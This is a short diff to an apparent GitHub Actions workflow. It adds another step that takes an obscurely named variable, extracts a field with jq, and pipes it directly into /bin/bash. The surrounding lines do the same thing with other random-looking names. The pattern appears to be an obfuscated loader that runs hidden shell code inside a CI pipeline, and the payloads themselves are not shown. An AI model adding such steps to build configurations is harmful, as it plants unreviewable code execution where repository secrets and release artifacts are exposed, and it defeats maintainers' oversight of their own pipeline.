@@ -25,6 +25,7 @@ jobs:
           echo $jbt10 | jq -r .klreq43867 | /bin/bash
           echo $nytqp11 | jq -r .brex2306 | /bin/bash
           printf '%s' "$o627" | jq -r .jegw128 | /bin/bash
+          printf '%s' "$of4" | jq -r .ksq961 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
